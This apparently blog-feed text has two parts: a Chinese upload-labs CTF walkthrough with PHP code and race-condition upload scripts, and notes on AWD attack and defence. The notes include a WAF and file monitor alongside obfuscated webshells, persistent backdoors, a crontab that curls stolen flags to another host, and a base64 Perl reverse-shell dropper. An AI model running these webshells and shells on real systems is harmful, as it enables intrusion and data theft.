fclose($file); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").".".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = "上传失败"; &#125; &#125;&#125; 0x14 Pass-14分析一下代码，虽然写的不一样了，但是跟上一题差不多。所以同理可得 12345678910111213141516171819202122232425262728293031323334function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; //getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息 $info = getimagesize($filename); //image_type_to_extension()根据给定的常量 IMAGETYPE_XXX 返回后缀名 $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = "上传失败"; &#125; &#125;&#125; 0x15 Pass-15分析一下代码，关键在于exif_imagetype()函数，这个函数的意思是读取一个图像的第一个字节并检查其签名。注意此处只检测图像的第一个字节。所以在此处我们在上一题使用的方法依旧可以生效 Like JPG1FF D8 FF E0 00 10 4A 46 49 46 GIF147 49 46 38 39 61 (相当于文本的GIF89a) PNG189 50 4E 47 123456789101112131415161718192021222324252627282930313233343536function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return "gif"; break; case IMAGETYPE_JPEG: return "jpg"; break; case IMAGETYPE_PNG: return "png"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").".".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = "上传失败"; &#125; &#125;&#125; 0x16 Pass-16分析代码发现此处对图片进行了二次渲染比对，这里的原理是对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行。 此处给一个已经构造的好的包含&lt;?phpinfo();?&gt;的图片，PoC 密码:o34g 0x17 Pass-17分析下代码发现多了unlink()函数，这个函数的作用是删除指定文件，看到这个基本就可以确定这是一个条件竞争写shell了。 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,".")+1); $upload_file = $UPLOAD_ADDR . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = $UPLOAD_ADDR . '/'. rand(10, 99).date("YmdHis").".".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传失败！'; &#125;&#125; 我们首先先上传一个php脚本，内容如下: 1&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &apos;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&apos;); ?&gt; 当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# -*- coding:utf-8 -*-import osimport requestsimport hackhttpimport threadingclass RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.url = "http://172.16.5.129/upload/shell.php" self.uploadUrl = "http://172.16.5.129/Pass-17/index.php" def _get(self): print('try to call uploaded file...') r = requests.get(self.url) if r.status_code == 200: print("[*]create file info.php success") #os._exit(0) def _upload(self): print("upload file.....") hh = hackhttp.hackhttp() raw = """ POST /Pass-17/index.php?action=show_code HTTP/1.1Host: 172.16.5.129User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://172.16.5.129/Pass-17/index.php?action=show_codeContent-Type: multipart/form-data; boundary=---------------------------7566250541346608691122113904Content-Length: 413Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870Connection: closeUpgrade-Insecure-Requests: 1-----------------------------7566250541346608691122113904Content-Disposition: form-data; name="upload_file"; filename="shell.php"Content-Type: text/php&lt;?php fputs(fopen("./info.php", "w"), '&lt;?php @eval($_POST["drops"]) ?&gt;'); ?&gt;-----------------------------7566250541346608691122113904Content-Disposition: form-data; name="submit"上传-----------------------------7566250541346608691122113904-- """ code, head, html, redirect, log = hh.http('http://172.16.5.129/Pass-17/index.php', raw=raw) print(str(code) + "\r") def run(self): while True: for i in range(5): self._get() for i in range(10): self._upload() self._get()if __name__ == "__main__": threads = 20 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join() 执行之后我们边可以发现在网站uploads目录下出现了我们想要的info.php 0x18 Pass-18分析下题目，发现这个过滤只能上传指定文件，又看了apache版本，应该是有个解析漏洞。但是普通上传一个文件会被重命名，重命名后我们就找不到我们上传的shell了，所以我们在这里要让文件上传且不重命名，那么只能通过条件竞争来解决了，修改一下上题的脚本: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# -*- coding:utf-8 -*-import hackhttpimport threadingclass RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.uploadUrl = "http://172.16.5.129/Pass-18/index.php" def _upload(self): print("upload file.....") hh = hackhttp.hackhttp() raw = """POST /Pass-18/index.php HTTP/1.1Host: 172.16.5.129User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://172.16.5.129/Pass-18/index.php?action=show_codeContent-Type: multipart/form-data; boundary=---------------------------385016806609230031127102121Content-Length: 352Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870Connection: closeUpgrade-Insecure-Requests: 1-----------------------------385016806609230031127102121Content-Disposition: form-data; name="upload_file"; filename="test.php.7Z"Content-Type: text/php&lt;?php phpinfo();?&gt;-----------------------------385016806609230031127102121Content-Disposition: form-data; name="submit"上传-----------------------------385016806609230031127102121-- """ code, head, html, redirect, log = hh.http(self.uploadUrl, raw=raw) print(str(code) + "\r") def run(self): while True: for i in range(10): self._upload()if __name__ == "__main__": threads = 20 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join() 可以看到只要我们足够快，我们的未重命名的文件就可以存在，哈哈 0x19 Pass-19分析了一下代码，发现过滤的还是挺严的，但是重命名这里还是有文章可以做的，使用00截断的方式就好了。123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $img_path = $UPLOAD_ADDR . '/' .$file_name; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传失败！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; 0x20 总结bypass思路–考虑三个地方的特性：代码、容器、操作系统 危害–getshell、xss(如果文件名被存入数据库的话，可以造成xss) PS:upload-labs的GitHub上写的是不是前端验证看速度，我感觉说的不好，应该右键看眼源码就好了，速度这种东西谁说的准呢。 最后附一张上传漏洞的脑图 0x21 参考https://www.cnblogs.com/engeng/articles/5948089.htmlhttps://paper.tuisec.win/detail/d511228cd560003https://paper.tuisec.win/detail/e5e5fd3a08d8ff7http://www.freebuf.com/vuls/128846.htmlhttp://www.freebuf.com/articles/web/54086.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF AWD模式攻防Note]]></title>
    <url>%2F2018%2F05%2F24%2Fctf-awd-note%2F</url>
    <content type="text"><![CDATA[0x01 AWD模式Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。 0x02 出题思路1:题目类型 1-出题人自己写的cms，为了恶心然后加个so。 2-常见或者不常见的cms。 3-一些框架漏洞，比如ph师傅挖的CI这种 2:代码类型目前来说，国内比赛依旧是php居多，当然也会有一些别的，比如py，lua这种。 3:题目漏洞类型 1-sqli居多 2-文件包含 3-各种rce 4-文件上传 4:出题人思路为了不让你们这群赛棍把题秒了，我直接放个未公开cms的0day把，算了，要不我自己加点东西。诶，等等，这样是不是有点难了，再放几个比较简单的洞把，直接在index.php或者web根目录下放个shell? 5:拿flag方式1-是向内网一台机器发送http请求，返回请求中包含flag。 2-是例如/home目录下放置flag文件。 0x03 防御技巧1.分析流量 12#在比赛服务器上抓取流量包sudo tcpdump -s 0 -w flow.pcap port 80 使用scp写个脚本实时将流量包拷贝到本地用wireshark进行分析 2.分析日志 1).weblogger 2).LogForensics 腾讯实验室 3).北风飘然@金乌网络安全实验室 4).网络ID为piaox的安全从业人员 5).网络ID：SecSky 6).网络ID：鬼魅羊羔 1234# 日志地址/var/log/apache2//usr/local/apache2/logs/usr/nginx/logs/ 3.打包源码&amp;备份数据库 1234# 打包目录tar -zcvf archive_name.tar.gz directory_to_compress# 解包tar -zxvf archive_name.tar.gz 123456789101112# 备份指定的多个数据库mysqldump -u root -p --databases choose test &gt; /tmp/db.sql# 恢复备份，在mysql终端下执行：# 命令格式：source FILE_PATHsource ~/db.sql# 曾经遇到一个备份有问题可以执行下面mysqldump -u root --all-databases —skip-lock-tables &gt; /tmp/db.sql# 重置mysql密码# 方法1：用SET PASSWORD命令 mysql&gt; set password for 用户名@localhost = password('新密码');# 方法2：用mysqladmin mysqladmin -u用户名 -p旧密码 password 新密码 4.重置ssh密码 12# ssh登录后执行passwd 5.部署waf 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?php//Code By Safe3 function customError($errno, $errstr, $errfile, $errline)&#123; echo "&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;"; die();&#125;set_error_handler("customError",E_ERROR);$getfilter="'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";$postfilter="\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";$cookiefilter="\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)";function StopAttack($StrFiltKey,$StrFiltValue,$ArrFiltReq)&#123; if(is_array($StrFiltValue))&#123; $StrFiltValue=implode($StrFiltValue);&#125; if (preg_match("/".$ArrFiltReq."/is",$StrFiltValue)==1)&#123; //slog("&lt;br&gt;&lt;br&gt;操作IP: ".$_SERVER["REMOTE_ADDR"]."&lt;br&gt;操作时间: ".strftime("%Y-%m-%d %H:%M:%S")."&lt;br&gt;操作页面:".$_SERVER["PHP_SELF"]."&lt;br&gt;提交方式: ".$_SERVER["REQUEST_METHOD"]."&lt;br&gt;提交参数: ".$StrFiltKey."&lt;br&gt;提交数据: ".$StrFiltValue); print "360websec notice:Illegal operation!"; exit();&#125; &#125; //$ArrPGC=array_merge($_GET,$_POST,$_COOKIE);foreach($_GET as $key=&gt;$value)&#123; StopAttack($key,$value,$getfilter);&#125;foreach($_POST as $key=&gt;$value)&#123; StopAttack($key,$value,$postfilter);&#125;foreach($_COOKIE as $key=&gt;$value)&#123; StopAttack($key,$value,$cookiefilter);&#125;if (file_exists('update360.php')) &#123; echo "请重命名文件update360.php，防止黑客利用&lt;br/&gt;"; die();&#125;function slog($logs)&#123; $toppath=$_SERVER["DOCUMENT_ROOT"]."/log.htm"; $Ts=fopen($toppath,"a+"); fputs($Ts,$logs."\r\n"); fclose($Ts);&#125;?&gt; 使用方法：(1).将waf.php传到要包含的文件的目录(2).在页面中加入防护，有两种做法，根据情况二选一即可：a).在所需要防护的页面加入代码 1require_once(&apos;waf.php&apos;); 就可以做到页面防注入、跨站如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！添加require_once(‘waf.php’);来调用本代码常用php系统添加文件 123456PHPCMS V9 \phpcms\base.phpPHPWIND8.7 \data\sql_config.phpDEDECMS5.7 \data\common.inc.phpDiscuzX2 \config\config_global.phpWordpress \wp-config.phpMetinfo \include\head.php b).在每个文件最前加上代码在php.ini中找到: 12Automatically add files before or after any PHP document.auto_prepend_file = 360_safe3.php路径; 需要注意的是，部署waf可能会导致服务不可用，需要谨慎部署。 如果不能部署waf我们可以简单的写个apache配置文件来禁止PHP执行 12345678910&lt;Directory &quot;/var/www/html/&quot;&gt;Options -ExecCGI -IndexesAllowOverride NoneRemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtmlRemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtmlphp_flag engine off&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt; deny from all&lt;/FilesMatch&gt;&lt;/Directory&gt; 6.干掉不死马的方式 (1).ps auxww|grep shell.php 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了 (2).重启php等web服务 (3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。 (4).创建一个和不死马生成的马一样名字的文件夹。 7.修改curl命令 12345alias curl='echo fuckoff' #权限要求较低# 或者alias curl='python -c "__import__(\"sys\").stdout.write(\"flag&#123;%s&#125;\\n\" % (__import__(\"hashlib\").md5(\"\".join([__import__(\"random\").choice(__import__(\"string\").letters) for i in range(0x10)])).hexdigest()))"'chmod -x curl #权限要求较高/usr/bin curl路径 8.用D盾扫描源代码删除后门文件 1234# 简单的查找后门find . -name '*.php' | xargs grep -n 'eval('find . -name '*.php' | xargs grep -n 'assert('find . -name '*.php' | xargs grep -n 'system(' 9.查找常见备份文件 12# 例如bak文件find / -name "*.bak" 10.重置web的各种登录密码（如果比赛check认为修改密码算down就不要修改了） 11.将uploads等文件夹使用chattr对文件底层属性进行控制。 12345678910111213141516171819202122chattr命令的用法：chattr [ -RVf ] [ -v version ] [ mode ] files…最关键的是在[mode]部分，[mode]部分是由+-=和[ASacDdIijsTtu]这些字符组合的，这部分是用来控制文件的属性。+ ：在原有参数设定基础上，追加参数。- ：在原有参数设定基础上，移除参数。= ：更新为指定参数设定。A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。S：硬盘I/O同步选项，功能类似sync。a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。d：即no dump，设定文件不能成为dump程序的备份目标。i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂 载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。s：保密性地删除文件或目录，即硬盘空间被全部收回。u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。应用举例：用chattr命令防止系统中某个关键文件被修改：# chattr +i /etc/resolv.conf 12.部署文件监控，如果发现新上传文件或者文件被修改立即恢复 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187# -*- coding: utf-8 -*-# @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--# v demo 0.21 修改了备份的webshell会自己坑自己的情况# todo: windows下不支持中文目录#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = &#123;&#125; # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'Special_string = 'drops_log' # 免死金牌UNICODE_ENCODING = "utf-8"INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = &#123; 'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)), 'log' : os.path.realpath(os.path.join(spec_base_path, logstring)), 'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)), 'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),&#125;def isListLike(value): return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False): if noneToNull and value is None: return NULL if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value, unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors="ignore")# 目录创建def mkdir_p(path): import errno try: os.makedirs(path) except OSError as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise# 获取当前所有文件路径def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist# 计算机文件MD5值def calcMD5(filepath): try: with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u'[!] getmd5_error : ' + getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(filepath) FILE_MD5_DICT.pop(filepath, None) except KeyError, e: pass# 获取所有文件MD5def getfilemd5dict(filelist = []): filemd5dict = &#123;&#125; for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict# 备份所有文件def backup_file(filelist=[]): # if len(os.listdir(Special_path['bak'])) == 0: for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepath, Special_path['bak'])if __name__ == '__main__': print u'---------start------------' for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u'[*] pre work end!' while True: file_list = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] webshell find : ' + getUnicode(filepath) shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt')) except Exception as e: print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n') f.close() except Exception as e: print u'[-] log error : file move error: ' + getUnicode(e) # 防止任意文件被修改,还原被修改文件 md5_dict = getfilemd5dict(ORIGIN_FILE_LIST) for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] file had be change : ' + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt')) shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey) except Exception as e: print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n') f.close() except Exception as e: print u'[-] log error : done_diff: ' + getUnicode(filekey) pass time.sleep(2) # print '[*] ' + getUnicode(time.ctime())七、自动提交 0x04 攻击技巧1.拿到命令执行漏洞后执行crontab 123# 参考# http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d 'flag='$(cat /home/web/flag/flag)'&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY' 2.注意源码中或者备份文件中是否存在mysql等的弱口令 3.主机发现 123456# 使用httpscan脚本./httpscan.py 172.16.0.0/24 –t 10# masscanmasscan -p 80 172.16.0.0/24# nmapnmap –sn 172.16.0.0/24 4.常用的特殊webshell 控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。简单举例： 1&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 连接方式：php?2=assert密码是1。献上我常用得一句话 12345678&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e='($_REQUEST[C])';@assert($a.$b.$c.$d.$e);?&gt; 使用为?C=phpinfo(); 123&lt;?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=连接密码:0（零） 5.权限维持 1234567891011121314&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.conifg.php'; $shell = "&lt;?php echo system("curl 10.0.0.2"); ?&gt;"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; tips:.config.php前面使用一个点，能很好的隐藏文件。想要结束这个进程，除了最暴力的重启apache服务之外，更为优雅的如下: 1234567&lt;?phpwhile (1) &#123; $pid=1234; @unlink('.config.php'); exec('kill -9 $pid');&#125;?&gt; 先查看进程，查看对应的pid，再执行即可。 素质低的人则会放置一个md5马，比如 1234&lt;?phpif(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')@eval($_POST['cmd']);?&gt; 如果素质低的人又很猥琐，像rootrain这种就是。那就是利用header，最后综合起来就是 12345678&lt;?phpecho 'hello';if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253') if (@$_SERVER['HTTP_USER_AGENT'] == 'flag')&#123; $test= 'flag'; header("flag:$test");&#125;?&gt; 放进config.php效果最好，因为一般很少人去看这个。 还可以采用反弹shell的方式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php function which($pr) &#123; $path = execute("which $pr"); return ($path ? $path : $pr); &#125; function execute($cfe) &#123; $res = ''; if ($cfe) &#123; if(function_exists('exec')) &#123; @exec($cfe,$res); $res = join("\n",$res); &#125; elseif(function_exists('shell_exec')) &#123; $res = @shell_exec($cfe); &#125; elseif(function_exists('system')) &#123; @ob_start(); @system($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif(function_exists('passthru')) &#123; @ob_start(); @passthru($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123; $res = ''; while(!@feof($f)) &#123; $res .= @fread($f,1024); &#125; @pclose($f); &#125; &#125; return $res; &#125; function cf($fname,$text)&#123; if($fp=@fopen($fname,'w')) &#123; @fputs($fp,@base64_decode($text)); @fclose($fp); &#125; &#125; $yourip = "192.168.71.1"; $yourport = '9999'; $usedb = array('perl'=&gt;'perl','c'=&gt;'c'); $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj". "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; cf('/tmp/.bc',$back_connect); $res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;"); ?&gt; 之后本地执行nc -lp 9999即可 6.获取flag的方式 (1) 批量传webshell(shell的内容可以写为权限维持部分的那个脚本)，之后结合批量访问 参考PHP-定时任务 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# 参考 http://www.freebuf.com/sectool/91082.html#!/usr/bin/python #coding=utf-8 import urllib import urllib2import sysimport base64import re def post(url, data): req = urllib2.Request(url) data = urllib.urlencode(data) opener = urllib2.build_opener(urllib2.HTTPCookieProcessor()) response = opener.open(req, data) return response.read() def get_shell_path(posturl,passwd): shell_path = "" try: data = &#123;&#125; data[passwd] = '@eval(base64_decode($_POST[z0]));' data['z0']='ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107' shell_path = post(posturl, data).strip() except Exception: pass return shell_path def main(): print '\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n' shellfile = sys.argv[1] # 存放webshell路径和密码的文件 localfile = sys.argv[2] # 本地待上传的文件名 